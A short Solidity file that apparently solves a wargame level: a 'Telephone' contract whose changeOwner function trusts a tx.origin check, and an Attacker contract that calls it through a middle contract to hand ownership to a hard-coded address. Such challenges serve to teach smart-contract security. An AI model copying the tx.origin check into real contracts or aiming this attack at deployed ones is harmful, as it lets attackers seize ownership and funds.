// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;
  address public txOrigin;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract Attacker{
  address public currentOwner;
  address public attackerAddress = 0xDbf02F355F8A7B715815Aa505C0a97F37015EfE3;

  function setOwner(address _victim) external {
    Telephone(_victim).changeOwner(attackerAddress);
  }
}